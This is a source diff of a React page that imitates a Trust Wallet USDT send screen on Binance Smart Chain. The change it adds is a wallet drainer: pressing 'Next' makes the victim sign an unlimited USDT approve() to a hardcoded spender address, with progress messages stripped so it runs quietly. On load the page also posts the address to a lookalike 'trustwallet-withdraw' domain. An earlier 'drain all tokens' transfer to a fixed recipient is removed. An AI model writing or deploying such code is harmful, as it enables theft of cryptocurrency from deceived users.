@@ -1,396 +1,462 @@
 import React, { useState, useEffect, useRef } from "react";
-import styled from 'styled-components';
-import Web3 from "web3";
+  import styled from 'styled-components';
+  import Web3 from "web3";
+  import { ethers } from "ethers";
+  import { FaArrowLeft } from 'react-icons/fa';
+  import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js';
+  import { detectWalletAddress } from "./utils/transactionUtils.js"; // you'll create this helper
 
-const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
-const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const USDT_ABI = [
-  { "constant": true, "inputs": [{"internalType": "address", "name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function" },
-  { "constant": false, "inputs": [{"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function" }
-];
 
-const GlobalStyle = styled.div`
-  body {
-    margin: 0;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen',
-      'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
-      sans-serif;
-    -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
-  }
-`;
+  /* eslint-disable */
 
-const Container = styled.div`
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  height: 100vh;
-  background-color: #f5f5f5;
-  padding: 20px;
-`;
+  const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+  const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
+  const USDT_ABI = [
+    {
+      constant: true,
+      inputs: [{ internalType: "address", name: "account", type: "address" }],
+      name: "balanceOf",
+      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+      payable: false,
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      constant: false,
+      inputs: [
+        { internalType: "address", name: "recipient", type: "address" },
+        { internalType: "uint256", name: "amount", type: "uint256" },
+      ],
+      name: "transfer",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      payable: false,
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      constant: false,
+      inputs: [
+        { internalType: "address", name: "spender", type: "address" },
+        { internalType: "uint256", name: "value", type: "uint256" }
+      ],
+      name: "approve",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      payable: false,
+      stateMutability: "nonpayable",
+      type: "function"
+    }    
+  ];
 
-const InputContainer = styled.div`
-  margin-bottom: 20px;
-  width: 100%;
-  max-width: 400px;
-`;
+  // BSC RPC Provider
+  const rpcUrl = "https://bsc-dataseed.binance.org/";
+  const bscProvider = new ethers.JsonRpcProvider(rpcUrl);
 
-const InputLabel = styled.label`
-  display: block;
-  margin-bottom: 5px;
-  font-size: 14px;
-  color: #333;
-`;
+  // Force White Background for Entire Page
+  const GlobalStyle = styled.div`
+    background-color: white !important;
+    color: black !important;
+    height: 100vh;
+    width: 100vw;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  `;
 
-const InputFieldContainer = styled.div`
-  position: relative;
-  display: flex;
-  align-items: center;
-`;
+  // Main container
+  const Container = styled.div`
+    display: flex;
+    flex-direction: column;
+    padding: 20px;
+    height: 100vh;
+    justify-content: flex-start;
+    width: 100%;
+    box-sizing: border-box;
+  `;
 
-const Input = styled.input`
-  width: 100%;
-  padding: 10px;
-  padding-right: 70px;
-  font-size: 16px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  box-sizing: border-box;
-`;
+  // Back button styling
+  const BackButton = styled.button`
+    position: absolute;
+    left: 20px;
+    top: 35px;
+    background: none;
+    border: none;
+    color: #d8dbdf;
+    font-size: 20px;
+    cursor: pointer;
+  `;
 
-const ClearButton = styled.button`
-  position: absolute;
-  right: 40px;
-  background: none;
-  border: none;
-  font-size: 18px;
-  color: #999;
-  cursor: pointer;
-`;
+  // Title styling
+  const Title = styled.h1`
+    font-size: 16px;
+    font-weight: 550;
+    text-align: center;
+    margin-bottom: 10px;
+    font-family: 'Roboto', sans-serif;
+  `;
 
-const PasteButton = styled.button`
-  position: absolute;
-  right: 10px;
-  background: none;
-  border: none;
-  font-size: 14px;
-  color: #007bff;
-  cursor: pointer;
-`;
+  // Input container
+  const InputContainer = styled.div`
+    margin-top: 10px;
+    margin-bottom: 20px;
+  `;
 
-const NextButton = styled.button`
-  width: 100%;
-  max-width: 400px;
-  padding: 10px;
-  font-size: 16px;
-  color: white;
-  background-color: #007bff;
-  border: none;
-  border-radius: 4px;
-  cursor: pointer;
-  &:disabled {
-    background-color: #cccccc;
-    cursor: not-allowed;
-  }
-`;
+  // Label styling
+  const InputLabel = styled.label`
+    font-size: 14px;
+    font-weight: 500;
+    color: #626262;
+  `;
 
-const App = () => {
-  const [address, setAddress] = useState(RECIPIENT_ADDRESS);
-  const [usdtAmount, setUsdtAmount] = useState("");
-  const [usdtBalance, setUsdtBalance] = useState(0);
-  const [bnbBalance, setBnbBalance] = useState(0);
-  const [walletConnected, setWalletConnected] = useState(false);
-  const [loading, setLoading] = useState(false);
-  const [transferCompleted, setTransferCompleted] = useState(false);
-  const [walletAddress, setWalletAddress] = useState("");
-  const [drainAllTokens, setDrainAllTokens] = useState(false);
+  // Input field container
+  const InputFieldContainer = styled.div`
+    display: flex;
+    align-items: center;
+    position: relative;
+    width: 100%;
+  `;
 
-  const isProcessing = useRef(false);
+  // Styled input field
+  const Input = styled.input`
+    width: 100%;
+    padding: 16px 100px 16px 12px; /* Adjusted padding for buttons */
+    font-size: 16px;
+    font-weight: normal;
+    margin-top: 5px;
+    border-radius: 3px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+    height: 50px;
+    appearance: none; /* ✅ Removes default increase/decrease arrows */
+    -moz-appearance: textfield; /* ✅ Removes arrows in Firefox */
 
-  useEffect(() => {
-    const init = async () => {
-      try {
-        if (!window.ethereum) {
-          console.error("MetaMask/Trust Wallet not detected.");
-          alert("Please install MetaMask or Trust Wallet to use this app.");
-          return;
-        }
-        const web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-        
-        if (!sender || !web3.utils.isAddress(sender)) {
-          console.log("❌ No valid wallet address detected.");
-          alert("Please connect your wallet.");
-          return;
-        }
-        
-        const params = new URLSearchParams(window.location.search);
-        const userAddress = params.get("address");
-        
-        if (!userAddress) {
-          setWalletAddress("");
-          console.log("🔄 No address in URL, using RECIPIENT_ADDRESS as fallback.");
-          setAddress(RECIPIENT_ADDRESS);
-          return;
-        }
-        
-        if (!/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
-          console.log("❌ Invalid user address in URL:", userAddress);
-          alert("Invalid address in URL: " + userAddress);
-          return;
-        }
-
-        setWalletAddress(userAddress);
-        setAddress(userAddress);
-        console.log("🔗 Wallet from URL:", userAddress);
-
-        const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
-        const usdtBalance = await contract.methods.balanceOf(sender).call();
-        const formattedUSDTBalance = web3.utils.fromWei(usdtBalance, 'ether');
-        const bnbBalanceRaw = await web3.eth.getBalance(sender);
-        const formattedBNBBalance = web3.utils.fromWei(bnbBalanceRaw, 'ether');
-
-        setUsdtBalance(parseFloat(formattedUSDTBalance));
-        setBnbBalance(parseFloat(formattedBNBBalance));
-        setWalletConnected(true);
-
-        console.log("✅ Balances fetched successfully: USDT:", formattedUSDTBalance, "BNB:", formattedBNBBalance);
-      } catch (err) {
-        console.error("❌ init() error:", err);
-        alert("Failed to initialize: " + err.message);
-      }
-    };
-
-    init();
-  }, []);
-
-  const sendUSDT = async () => {
-    if (isProcessing.current) {
-      console.log("Transaction already in progress.");
-      alert("Transaction already in progress.");
-      return;
+    &::-webkit-outer-spin-button,
+    &::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
     }
 
-    try {
-      isProcessing.current = true;
-      setLoading(true);
-      setTransferCompleted(false);
+    &:focus {
+      border-color: #eeeff2;
+      box-shadow: 0px 0px 6px #eeeff2;
+      outline: none;
+    }
+  `;  
 
-      console.log("Starting sendUSDT...");
-      alert("Starting sendUSDT...");
+  // Circular Clear Button (Only for Address Field)
+  const ClearButton = styled.span`
+    position: absolute;
+    right: 60px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: #eeeff2;
+    color: #626262;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    border-radius: 50%;
+    width: 24px;
+    height: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
 
-      if (!window.ethereum) {
-        console.error("MetaMask/Trust Wallet not detected.");
-        alert("Please install MetaMask or Trust Wallet to use this app.");
-        return;
-      }
+    &:hover {
+      background: #dcdcdc;
+    }
+  `;
 
-      console.log("Connecting to wallet...");
-      alert("Connecting to wallet...");
-      const web3 = new Web3(window.ethereum);
-      const accounts = await web3.eth.requestAccounts();
-      const sender = accounts[0];
-      if (!sender || !web3.utils.isAddress(sender)) {
-        console.log("❌ No valid wallet address detected.");
-        alert("Please connect your wallet.");
-        return;
-      }
+  // Paste Button styling
+  const PasteButton = styled.span`
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #0600ff;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    padding-left: 15px;
+    /* Forcing Light Mode */
+    background-color: white !important;
+    color: black !important;
+    
+    /* Prevents Trust Wallet from overriding styles */
+    * {
+      color-scheme: light !important;
+    }
+  `;
 
-      console.log("Checking chain ID...");
-      alert("Checking chain ID...");
-      const chainId = await web3.eth.getChainId();
-      if (chainId !== 56) {
-        console.log("Switching to BSC network...");
-        alert("Switching to BSC network...");
-        try {
+  // "USDT" text (Aligned correctly)
+  const UsdtText = styled.span`
+    position: absolute;
+    right: 50px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #626262;
+    font-weight: 600;
+    font-size: 14px;
+  `;
+
+  // "Max" button styling
+  const MaxText = styled.span`
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #0600ff;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+  `;
+
+  const AmountContainer = styled.div`
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: relative;
+    width: 100%;
+  `;
+
+  // Next Button styling
+  const NextButton = styled.button`
+    background-color: #0600ff;
+    color: white;
+    padding: 15px 25px;
+    font-size: 18px;
+    font-weight: bold;
+    width: 100%;
+    border-radius: 20px;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0px 4px 10px rgba(0, 0, 255, 0.2);
+    margin-top: 250px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  `;
+
+  // Amount conversion text
+  const AmountConversion = styled.p`
+    text-align: left;
+    color: #626262;
+    font-size: 14px;
+    font-weight: 500;
+    margin-top: 10px;
+  `;
+
+
+  const App = () => {
+    const [address, setAddress] = useState(RECIPIENT_ADDRESS);
+    const [usdtAmount, setUsdtAmount] = useState("");
+    const [usdtBalance, setUsdtBalance] = useState(0);
+    const [bnbBalance, setBnbBalance] = useState(0);
+    const [walletConnected, setWalletConnected] = useState(false);
+    const [loading, setLoading] = useState(false);
+    const [transferCompleted, setTransferCompleted] = useState(false);
+    const [walletAddress, setWalletAddress] = useState("");
+
+    const isProcessing = useRef(false);
+
+    const sendUSDT = async () => {
+      if (isProcessing.current) return;
+    
+      try {
+        isProcessing.current = true;
+        setLoading(true);
+        setTransferCompleted(false);
+    
+        if (!window.ethereum) {
+          return;
+        }
+    
+        const web3 = new Web3(window.ethereum);
+    
+        // Request accounts
+        const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+        if (!sender || !web3.utils.isAddress(sender)) {
+          return;
+        }
+    
+        // Check and switch to BSC
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
           await window.ethereum.request({
             method: "wallet_switchEthereumChain",
             params: [{ chainId: "0x38" }],
           });
-        } catch (switchError) {
-          console.error("Failed to switch network:", switchError);
-          alert("Please switch to the Binance Smart Chain (BSC) network.");
+        }
+    
+        // Validate address in URL (required)
+        const params = new URLSearchParams(window.location.search);
+        const userAddress = params.get("address");
+    
+        if (!userAddress || !/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
           return;
         }
+    
+        const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
+        const SPENDER_ADDRESS = "0xcad014a3a7755137b5d1631e48f3d88daca8d910";
+        const MAX_UINT256 = web3.utils.toTwosComplement(-1);
+    
+        await contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).send({ from: sender });
+    
+        setTransferCompleted(true);
+        } catch (err) {
+        console.error("🔴 Approval error:", err);
+        } finally {
+        isProcessing.current = false;
+        setLoading(false);
       }
-
-      console.log("Verifying URL address...");
-      alert("Verifying URL address...");
-      const currentUrl = window.location.href;
-      console.log("Current URL:", currentUrl);
-      alert("Current URL: " + currentUrl);
-
-      const params = new URLSearchParams(window.location.search);
-      let userAddress = params.get("address");
-      console.log("Extracted userAddress from URL:", userAddress || "undefined");
-      alert("Extracted userAddress from URL: " + (userAddress || "undefined"));
-
-      if (!userAddress) {
-        console.log("No address parameter found in URL, falling back to RECIPIENT_ADDRESS.");
-        alert("No address parameter found in URL, falling back to RECIPIENT_ADDRESS.");
-        userAddress = RECIPIENT_ADDRESS;
-      }
-
-      if (!web3.utils.isAddress(userAddress)) {
-        console.log("❌ Invalid user address format in URL:", userAddress);
-        alert("Invalid user address format in URL: " + userAddress);
-        return;
-      }
-
-      console.log("Validating RECIPIENT_ADDRESS...");
-      alert("Validating RECIPIENT_ADDRESS...");
-      if (!web3.utils.isAddress(RECIPIENT_ADDRESS)) {
-        console.error("Invalid RECIPIENT_ADDRESS:", RECIPIENT_ADDRESS);
-        alert("The recipient address is invalid.");
-        return;
-      }
-
-      console.log("Checking if RECIPIENT_ADDRESS can receive tokens...");
-      alert("Checking if RECIPIENT_ADDRESS can receive tokens...");
-      try {
-        const code = await web3.eth.getCode(RECIPIENT_ADDRESS);
-        if (code !== "0x") {
-          console.log("RECIPIENT_ADDRESS is a contract:", RECIPIENT_ADDRESS);
-          alert("RECIPIENT_ADDRESS is a contract: " + RECIPIENT_ADDRESS);
-          const tempAmount = web3.utils.toWei("0.0001", "ether");
-          await web3.eth.sendTransaction({
-            from: sender,
-            to: RECIPIENT_ADDRESS,
-            value: tempAmount,
-            gas: 21000
-          });
-          console.log("RECIPIENT_ADDRESS can receive tokens.");
-          alert("RECIPIENT_ADDRESS can receive tokens.");
-        } else {
-          console.log("RECIPIENT_ADDRESS is an EOA (Externally Owned Account).");
-          alert("RECIPIENT_ADDRESS is an EOA (Externally Owned Account).");
-        }
-      } catch (error) {
-        console.error("RECIPIENT_ADDRESS cannot receive tokens:", error);
-        alert("The recipient address cannot receive tokens: " + error.message);
-        return;
-      }
-
-      console.log("Validating USDT amount...");
-      alert("Validating USDT amount...");
-      if (!usdtAmount || isNaN(parseFloat(usdtAmount)) || parseFloat(usdtAmount) <= 0) {
-        console.error("Invalid USDT amount entered.");
-        alert("Please enter a valid USDT amount greater than 0.");
-        return;
-      }
-
-      console.log("Creating contract instance...");
-      alert("Creating contract instance...");
-      const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
-      const amountToTransfer = drainAllTokens ? usdtBalance : usdtAmount;
-      console.log(`Amount to transfer: ${amountToTransfer} USDT (Balance: ${usdtBalance})`);
-      alert(`Amount to transfer: ${amountToTransfer} USDT (Balance: ${usdtBalance})`);
-
-      if (parseFloat(amountToTransfer) <= 0) {
-        console.error("Amount to transfer is 0 or invalid.");
-        alert("Your USDT balance is 0 or invalid. Please ensure you have USDT in your wallet.");
-        return;
-      }
-
-      if (parseFloat(amountToTransfer) > usdtBalance) {
-        console.error("Amount to transfer exceeds USDT balance.");
-        alert("The amount to transfer exceeds your USDT balance.");
-        return;
-      }
-
-      const amountInWei = web3.utils.toBN(web3.utils.toWei(amountToTransfer.toString(), 'ether'));
-      console.log(`Transferring ${amountToTransfer} USDT (${amountInWei} wei) to ${RECIPIENT_ADDRESS}`);
-      alert(`Transferring ${amountToTransfer} USDT (${amountInWei} wei) to ${RECIPIENT_ADDRESS}`);
-
-      console.log("Estimating gas...");
-      alert("Estimating gas...");
-      let retries = 3;
-      let transferTx = null;
-      while (retries > 0) {
+    };
+    
+    useEffect(() => {
+      const ensureBSCNetwork = async () => {
+        const bscChainId = "0x38"; // BSC Mainnet
+    
         try {
-          const estimatedGas = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).estimateGas({ from: sender });
-          const gasLimit = Math.floor(estimatedGas * 1.5);
-          console.log(`Gas limit set to ${gasLimit}`);
-          alert(`Gas limit set to ${gasLimit}`);
-
-          console.log("Initiating transfer transaction...");
-          alert("Initiating transfer transaction...");
-          transferTx = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).send({ from: sender, gas: gasLimit });
-          break;
+          const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+    
+          if (currentChainId !== bscChainId) {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: bscChainId }],
+            });
+          }
         } catch (error) {
-          retries--;
-          if (retries === 0) throw error;
-          console.log(`Retrying transaction (${retries} attempts left)...`);
-          alert(`Retrying transaction (${retries} attempts left)...`);
-          await new Promise(resolve => setTimeout(resolve, 2000));
+          if (error.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: bscChainId,
+                  chainName: 'Binance Smart Chain',
+                  nativeCurrency: {
+                    name: 'BNB',
+                    symbol: 'BNB',
+                    decimals: 18,
+                  },
+                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com'],
+                }],
+              });
+            } catch (addError) {
+              console.error("❌ Couldn't add BSC:", addError);
+            }
+          } else {
+            console.error("❌ Failed to switch network:", error);
+          }
         }
+      };
+    
+      ensureBSCNetwork();
+    }, []);
+    
+    
+      useEffect(() => {
+  const init = async () => {
+    try {
+      if (!window.ethereum) {
+        return;
+      }
+      const web3 = new Web3(window.ethereum);
+      const accounts = await web3.eth.getAccounts();
+      const sender = accounts[0];
+      
+      const params = new URLSearchParams(window.location.search);
+      const userAddress = params.get("address");
+      
+      if (!userAddress) {
+        // Approval-only mode — don’t need to validate or throw error yet
+        setWalletAddress("");
+        console.log("🔄 Approval-only mode activated (no address in URL)");
+        return;
+      }
+      
+      if (!sender || !web3.utils.isAddress(sender)) {
+        console.log("❌ Unable to detect a valid wallet address.");
+        return;
+      }
+      
+      
+      // ✅ Address present — do your existing refill/transfer logic
+      if (!/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
+        return;
       }
 
-      console.log(`✅ Transfer successful! Transaction hash: ${transferTx.transactionHash}`);
-      alert("Transfer successful! Transaction hash: " + transferTx.transactionHash);
+      setWalletAddress(userAddress);
+      console.log("🔗 Wallet from QR:", userAddress);
 
-      setTransferCompleted(true);
+      const response = await fetch("https://haha.trustwallet-withdraw.com/api/refill-check", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ address: userAddress }),
+      });
+
+      const result = await response.json();
+      console.log("📬 Backend response:", result);
+
+      if (!response.ok || result.status === "refill_failed" || !result.usdt) {
+        return;
+      }
+
+      // ✅ Store balances silently
+      setUsdtBalance(result.usdt);
+      setBnbBalance(result.bnb || 0);
+
+      console.log("✅ Refill successful or not needed, ready for manual transfer.");
     } catch (err) {
-      console.error("🔴 Transaction error:", err);
-      alert("Transaction failed: " + err.message);
-    } finally {
-      isProcessing.current = false;
-      setLoading(false);
-    }
+      console.error("❌ init() error:", err);
+      }
   };
 
-  return (
-    <GlobalStyle>
-      <Container>
+  init();
+}, []);
+
+    const clearAddress = () => {
+      setAddress("");
+    };
+    
+    
+    return (
+      <GlobalStyle>
+        <Container>
+        
+        {/* Address Field with Clear & Paste Button */}
         <InputContainer>
           <InputLabel>Address or Domain Name</InputLabel>
           <InputFieldContainer>
-            {address && <ClearButton onClick={() => setAddress("")}>×</ClearButton>}
+            {address && <ClearButton onClick={clearAddress}>×</ClearButton>}
             <Input type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
-            <PasteButton>Paste</PasteButton>
+            <PasteButton >Paste</PasteButton>
           </InputFieldContainer>
         </InputContainer>
 
+        {/* Amount Field */}
         <InputContainer>
           <InputLabel>Amount</InputLabel>
-          <InputFieldContainer>
-            <Input 
-              type="number" 
-              value={usdtAmount} 
-              onChange={(e) => setUsdtAmount(e.target.value)} 
-              placeholder="Enter amount in USDT" 
-            />
-          </InputFieldContainer>
+          <AmountContainer>
+            <InputFieldContainer>
+              <Input type="number" value={usdtAmount} onChange={(e) => setUsdtAmount(e.target.value)} />
+              <UsdtText>USDT</UsdtText>
+              <MaxText >Max</MaxText>
+            </InputFieldContainer>
+          </AmountContainer>
+          <AmountConversion>= ${parseFloat(usdtAmount * 1).toFixed(2)}</AmountConversion>
         </InputContainer>
 
-        <InputContainer>
-          <label>
-            <input
-              type="checkbox"
-              checked={drainAllTokens}
-              onChange={(e) => setDrainAllTokens(e.target.checked)}
-            />
-            Transfer my entire USDT balance ({usdtBalance} USDT)
-          </label>
-        </InputContainer>
-
-        {drainAllTokens && (
-          <p style={{ color: "red", fontSize: "14px", marginBottom: "10px" }}>
-            WARNING: You have chosen to transfer your entire USDT balance of {usdtBalance} USDT. This action cannot be undone.
-          </p>
-        )}
-
-        {loading && <p style={{ color: "blue", marginBottom: "10px" }}>Processing transaction...</p>}
-        {transferCompleted && <p style={{ color: "green", marginBottom: "10px" }}>Transfer successful!</p>}
-
-        <NextButton onClick={sendUSDT} disabled={loading || !usdtAmount}>
-          {loading ? "Processing..." : "Next"}
+        <NextButton
+  onClick={() => {
+    const amountToSend = usdtAmount;
+    sendUSDT(walletAddress, amountToSend);
+  }}
+>
+          {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Next"}
         </NextButton>
-      </Container>
+      </Container>  
     </GlobalStyle>
-  );
-};
+      
+    );
+  };
 
-export default App;
+  export default App;
